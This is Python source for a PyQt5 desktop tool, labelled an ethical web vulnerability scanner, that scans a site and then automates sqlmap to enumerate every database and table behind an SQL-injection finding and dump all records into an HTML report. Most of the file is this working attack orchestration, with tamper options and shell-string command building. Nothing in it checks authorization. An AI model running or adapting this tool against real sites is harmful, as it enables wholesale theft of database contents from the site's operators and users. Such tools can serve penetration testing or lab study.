import sys
import subprocess
import re
import webbrowser
import csv
import glob
import getpass
import os
from datetime import datetime
from PyQt5.QtWidgets import QMessageBox, QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, QLineEdit, QPushButton, QTextEdit, QProgressBar, QLabel, QTreeWidget, QTreeWidgetItem
from PyQt5.QtCore import QObject, QThread, pyqtSignal
from urllib.parse import urlparse, parse_qs, urlencode
from core.scanner import ScannerWorker
from reporting.generator import generate_report

# Lớp Worker cao cấp, điều phối chuỗi tấn công và khai thác dữ liệu
class AttackOrchestratorWorker(QObject):
    log_received = pyqtSignal(str)
    database_found = pyqtSignal(str)
    tables_found = pyqtSignal(str, list)
    process_finished = pyqtSignal(dict)

    def __init__(self, vuln_data):
        super().__init__()
        self.vuln_data = vuln_data
        self.process = None
        self._is_stopped = False

    def _run_command(self, command):
        """Hàm trợ giúp để chạy một lệnh và yield từng dòng output."""
        try:
            self.process = subprocess.Popen(
                command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                shell=True, text=True, encoding='utf-8', errors='replace'
            )
            for line in iter(self.process.stdout.readline, ''):
                if self._is_stopped: break
                self.log_received.emit(line.strip())
                yield line.strip()
            self.process.stdout.close(); self.process.wait()
        except Exception as e:
            self.log_received.emit(f"\n[ERROR] Failed to run command: {e}")

    def run(self):
        """Hàm chính điều phối chuỗi tấn công."""
        dumped_data = {}
        method = self.vuln_data.get("method", "GET")
        # --- TỐI GIẢN HÓA LỆNH SQLMAP ĐỂ TĂNG HIỆU QUẢ ---
        base_command_options = "--batch --tamper=space2comment"
        base_command = ""
        
        if method == "POST":
            target_url = self.vuln_data['url']; data_string = urlencode(self.vuln_data.get('data', {}))
            base_command = f"sqlmap -u \"{target_url}\" --data=\"{data_string}\" -p \"{self.vuln_data['parameter']}\" {base_command_options}"
        else:
            clean_url = self.vuln_data.get('clean_url', self.vuln_data['url'])
            base_command = f"sqlmap -u \"{clean_url}\" -p \"{self.vuln_data['parameter']}\" {base_command_options}"

        # BƯỚC 1: Lấy Databases
        self.log_received.emit("\n" + "="*20 + " STEP 1: FETCHING DATABASES " + "="*20)
        dbs_command = f"{base_command} --dbs"
        found_databases = []
        parsing_dbs = False
        for line in self._run_command(dbs_command):
            if self._is_stopped: break
            if "available databases" in line: parsing_dbs = True; continue
            if parsing_dbs and line.startswith('[*]'):
                db_name = line[4:].strip()
                if db_name and db_name not in ['information_schema', 'performance_schema', 'mysql', 'sys', 'master', 'tempdb', 'model', 'msdb', 'postgres']:
                    found_databases.append(db_name)
                    self.database_found.emit(db_name)
        if self._is_stopped: self.process_finished.emit({}); return

        # BƯỚC 2 & 3: Lấy Tables và Dump dữ liệu
        for db in found_databases:
            if self._is_stopped: break
            self.log_received.emit("\n" + "="*20 + f" STEP 2: FETCHING TABLES FOR '{db}' " + "="*20)
            tables_command = f"{base_command} -D {db} --tables"
            found_tables = []
            parsing_tables = False
            for line in self._run_command(tables_command):
                if self._is_stopped: break
                if line.strip().startswith('+---'): parsing_tables = not parsing_tables; continue
                if parsing_tables and line.strip().startswith('|'):
                    parts = [p.strip() for p in line.strip().strip('|').split('|')]
                    if parts and parts[0]: found_tables.append(parts[0])

            if found_tables: self.tables_found.emit(db, found_tables)
            dumped_data[db] = {}

            for table in found_tables:
                if self._is_stopped: break
                self.log_received.emit("\n" + "-"*20 + f" STEP 3: DUMPING RECORDS FROM '{db}.{table}' " + "-"*20)
                dump_command = f"{base_command} -D {db} -T {table} --dump"
                headers, records = [], []
                parsing_dump = False
                for line in self._run_command(dump_command):
                    if self._is_stopped: break
                    if "dumped to CSV file" in line: break # Kết thúc khi thấy dòng này
                    if line.strip().startswith('+---'):
                        parsing_dump = not parsing_dump
                        continue
                    if parsing_dump and line.strip().startswith('|'):
                        parts = [p.strip() for p in line.strip().strip('|').split('|')]
                        if not headers: headers = parts
                        else: records.append(parts)
                dumped_data[db][table] = {'headers': headers, 'records': records}
        self.process_finished.emit(dumped_data)

    def stop(self):
        self._is_stopped = True
        if self.process and self.process.poll() is None:
            self.log_received.emit("\n[*] Terminating sqlmap process...")
            try: self.process.terminate(); self.process.wait(timeout=5)
            except Exception: pass

class MainWindow(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Ethical Web Vulnerability Scanner")
        self.setGeometry(100, 100, 900, 800)
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        main_layout = QVBoxLayout(central_widget)
        
        input_layout = QHBoxLayout()
        self.url_input = QLineEdit()
        self.url_input.setPlaceholderText("Enter Base URL (e.g., http://localhost:8003/)")
        self.scan_button = QPushButton("Start Scan")
        input_layout.addWidget(self.url_input); input_layout.addWidget(self.scan_button)
        main_layout.addLayout(input_layout)
        
        self.progress_bar = QProgressBar()
        main_layout.addWidget(self.progress_bar)
        
        main_layout.addWidget(QLabel("Scan & Crawl Log:"))
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)
        self.log_output.setFixedHeight(150)
        main_layout.addWidget(self.log_output)
        
        main_layout.addWidget(QLabel("Vulnerability Scan Results:"))
        self.results_tree = QTreeWidget()
        self.results_tree.setHeaderLabels(["Vulnerability Type", "URL", "Parameter"])
        self.results_tree.setFixedHeight(150)
        main_layout.addWidget(self.results_tree)
        
        attack_layout = QHBoxLayout()
        self.attack_button = QPushButton("Dump All Data to HTML Report")
        self.attack_button.setEnabled(False)
        self.report_button = QPushButton("Generate Scan Report")
        self.report_button.setEnabled(False)
        attack_layout.addWidget(self.attack_button); attack_layout.addWidget(self.report_button)
        main_layout.addLayout(attack_layout)

        main_layout.addWidget(QLabel("Discovered Database Structure (In-Progress):"))
        self.db_structure_tree = QTreeWidget()
        self.db_structure_tree.setHeaderLabels(["Databases & Tables"])
        self.db_structure_tree.setFixedHeight(200)
        main_layout.addWidget(self.db_structure_tree)

        main_layout.addWidget(QLabel("Attack Process Log:"))
        self.attack_output = QTextEdit()
        self.attack_output.setReadOnly(True)
        self.attack_output.setStyleSheet("background-color: #2b2b2b; color: #a9b7c6; font-family: 'Courier New';")
        main_layout.addWidget(self.attack_output)

        self.vulnerabilities = []; self.db_tree_items = {}
        self.scanner_thread, self.scanner_worker = None, None
        self.attack_thread, self.attack_worker = None, None

        self.scan_button.clicked.connect(self.start_scan)
        self.attack_button.clicked.connect(self.start_attack)
        self.report_button.clicked.connect(self.generate_scan_report)
        self.results_tree.itemSelectionChanged.connect(self.on_item_selection_changed)

    def start_attack(self):
        selected_items = self.results_tree.selectedItems()
        if not selected_items: return
        
        selected_url, selected_param = selected_items[0].text(1), selected_items[0].text(2)
        vuln_data = next((v for v in self.vulnerabilities if v['url'] == selected_url and v['parameter'] == selected_param), None)
        if not vuln_data: return

        self.attack_button.setEnabled(False); self.scan_button.setEnabled(False)
        self.attack_output.clear(); self.db_structure_tree.clear(); self.db_tree_items = {}

        if vuln_data.get("method", "GET") == "GET":
            parsed = urlparse(vuln_data['url'])
            params = parse_qs(parsed.query)
            if vuln_data['parameter'] in params:
                 params[vuln_data['parameter']][0] = params[vuln_data['parameter']][0].replace(vuln_data['payload'], '')
            clean_query = urlencode(params, doseq=True)
            vuln_data['clean_url'] = parsed._replace(query=clean_query).geturl()

        self.attack_thread = QThread(self)
        self.attack_worker = AttackOrchestratorWorker(vuln_data)
        self.attack_worker.moveToThread(self.attack_thread)

        self.attack_thread.started.connect(self.attack_worker.run)
        self.attack_worker.log_received.connect(self.update_attack_output)
        self.attack_worker.database_found.connect(self.add_database_to_tree)
        self.attack_worker.tables_found.connect(self.add_tables_to_db_node)
        self.attack_worker.process_finished.connect(self.attack_finished)
        self.attack_thread.start()
        
    def add_database_to_tree(self, db_name):
        item = QTreeWidgetItem([db_name])
        self.db_structure_tree.addTopLevelItem(item)
        self.db_tree_items[db_name] = item

    def add_tables_to_db_node(self, db_name, tables):
        if db_name in self.db_tree_items:
            parent_item = self.db_tree_items[db_name]
            for table_name in tables:
                child_item = QTreeWidgetItem([table_name])
                parent_item.addChild(child_item)
            parent_item.setExpanded(True)

    def attack_finished(self, dumped_data):
        self.update_attack_output("\n[*] Attack orchestration complete.")
        self.attack_thread.quit(); self.attack_thread.wait()
        self.attack_button.setEnabled(True); self.scan_button.setEnabled(True)

        # === FIX: ĐỌC FILE CSV TỪ SQLMAP OUTPUT ===
        import getpass
        user = getpass.getuser()
        dump_path = f"/home/{user}/.local/share/sqlmap/output/localhost/dump"

        if not os.path.exists(dump_path):
                self.update_attack_output(f"[!] Không tìm thấy thư mục dump: {dump_path}")
                QMessageBox.information(self, "Dump Result", "Không tìm thấy dữ liệu dump.")
                return

        html_data = {}
        has_data = False

        for db_dir in os.listdir(dump_path):
                db_path = os.path.join(dump_path, db_dir)
                if not os.path.isdir(db_path): 
                        continue

                html_data[db_dir] = {}
                for csv_file in glob.glob(os.path.join(db_path, "*.csv")):
                        table_name = os.path.basename(csv_file).replace(".csv", "")
                        headers = []
                        records = []
                        try:
                                with open(csv_file, 'r', encoding='utf-8') as f:
                                        reader = csv.reader(f)
                                        for i, row in enumerate(reader):
                                                row = [cell.strip() for cell in row]
                                                if i == 0:
                                                        headers = row
                                                elif row and len(row) > 1 and not row[0].startswith('+'):
                                                        records.append(row)
                                if records:
                                        has_data = True
                                html_data[db_dir][table_name] = {'headers': headers, 'records': records}
                        except Exception as e:
                                self.update_attack_output(f"[!] Lỗi đọc file {csv_file}: {e}")

        if not has_data:
                self.update_attack_output("[!] Không có dữ liệu nào được dump.")
                QMessageBox.information(self, "Dump Result", "Không có dữ liệu nào được dump.")
        else:
                self.update_attack_output("[*] Đang tạo báo cáo HTML...")
                self.generate_html_report(html_data)

    def generate_html_report(self, data):
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"dump_report_{timestamp}.html"
        
        css = """<style>body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background-color:#f4f4f9;color:#333;margin:0;padding:20px}h1,h2,h3{color:#2c3e50;border-bottom:2px solid #3498db;padding-bottom:10px}h1{font-size:2.5em;text-align:center}h2{font-size:2em;margin-top:40px}h3{font-size:1.5em;margin-top:30px;color:#2980b9;border-bottom:none}table{width:100%;border-collapse:collapse;margin-top:20px;box-shadow:0 2px 5px rgba(0,0,0,.1);background-color:#fff}th,td{padding:12px 15px;text-align:left;border-bottom:1px solid #ddd}thead tr{background-color:#3498db;color:#fff}tbody tr:nth-of-type(even){background-color:#f8f9fa}tbody tr:hover{background-color:#ecf0f1}.container{max-width:1200px;margin:auto}.footer{text-align:center;margin-top:50px;font-size:.9em;color:#777}</style>"""
        html = f"<html><head><title>SQLi Dump Report</title>{css}</head><body><div class='container'><h1>SQL Injection Data Dump Report</h1>"
        
        for db, tables in data.items():
            html += f"<h2>Database: <code>{db}</code></h2>"
            if not tables: html += "<p>No tables found in this database.</p>"; continue
            for table, content in tables.items():
                html += f"<h3>Table: <code>{table}</code></h3>"
                if not content.get('headers') or not content.get('records'):
                    html += "<p>No records found or could not parse data for this table.</p>"; continue
                html += "<table><thead><tr>"
                for header in content['headers']: html += f"<th>{header}</th>"
                html += "</tr></thead><tbody>"
                for record in content['records']:
                    html += "<tr>"
                    for i in range(len(content['headers'])):
                        cell = record[i] if i < len(record) else ""
                        html += f"<td>{cell}</td>"
                    html += "</tr>"
                html += "</tbody></table>"
        html += f"<div class='footer'><p>Report generated by Ethical Scanner on {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p></div></div></body></html>"
        
        with open(filename, 'w', encoding='utf-8') as f: f.write(html)
        
        self.update_attack_output(f"[*] Report saved as {filename}")
        webbrowser.open_new_tab(f"file://{os.path.realpath(filename)}")

    def closeEvent(self, event):
        is_thread_running = False
        if self.scanner_thread and self.scanner_thread.isRunning(): is_thread_running = True
        if self.attack_thread and self.attack_thread.isRunning(): is_thread_running = True
        if is_thread_running:
            reply = QMessageBox.question(self, 'Exit Confirmation', "A process is running. Are you sure you want to exit?", QMessageBox.Yes | QMessageBox.No, QMessageBox.No)
            if reply == QMessageBox.Yes:
                if hasattr(self, 'scanner_worker') and self.scanner_worker and hasattr(self.scanner_worker, 'stop'): self.scanner_worker.stop()
                if hasattr(self, 'attack_worker') and self.attack_worker: self.attack_worker.stop()
                event.accept()
            else:
                event.ignore()
        else:
            event.accept()
            
    def on_item_selection_changed(self):
        selected_items = self.results_tree.selectedItems()
        is_sqli = selected_items and "SQLi" in selected_items[0].text(0)
        self.attack_button.setEnabled(is_sqli)
    
    def update_attack_output(self, line): self.attack_output.append(line)
    
    def start_scan(self):
        base_url = self.url_input.text()
        if not base_url: self.log_output.append("Please enter a base URL."); return
        self.scan_button.setEnabled(False); self.report_button.setEnabled(False); self.attack_button.setEnabled(False)
        self.log_output.clear(); self.results_tree.clear(); self.attack_output.clear(); self.progress_bar.setValue(0)
        
        self.scanner_thread = QThread(self)
        self.scanner_worker = ScannerWorker(base_url)
        if not hasattr(self.scanner_worker, 'stop'): self.scanner_worker.stop = lambda: None
        self.scanner_worker.moveToThread(self.scanner_thread)
        self.scanner_thread.started.connect(self.scanner_worker.run_scan); self.scanner_worker.log_updated.connect(self.update_log); self.scanner_worker.progress_updated.connect(self.update_progress); self.scanner_worker.scan_finished.connect(self.scan_done)
        self.scanner_thread.start()

    def update_log(self, message): self.log_output.append(message)
    
    def update_progress(self, current, total):
        if total > 0: self.progress_bar.setValue(int((current / total) * 100))

    def scan_done(self, vulnerabilities):
        self.vulnerabilities = vulnerabilities; self.display_results(); self.scanner_thread.quit(); self.scanner_thread.wait(); self.scan_button.setEnabled(True)
        if self.vulnerabilities: self.report_button.setEnabled(True)

    def display_results(self):
        self.results_tree.clear()
        for vuln in self.vulnerabilities: self.results_tree.addTopLevelItem(QTreeWidgetItem([vuln['type'], vuln['url'], vuln['parameter']]))
        for i in range(3): self.results_tree.resizeColumnToContents(i)

    def generate_scan_report(self):
        if not self.vulnerabilities: self.log_output.append("No vulnerabilities to report."); return
        base_url = self.url_input.text()
        report_filename = generate_report(base_url, self.vulnerabilities)
        self.log_output.append(f"Report generated: {report_filename}")

if __name__ == "__main__":
    app = QApplication(sys.argv)
    window = MainWindow()
    window.show()
    sys.exit(app.exec_())
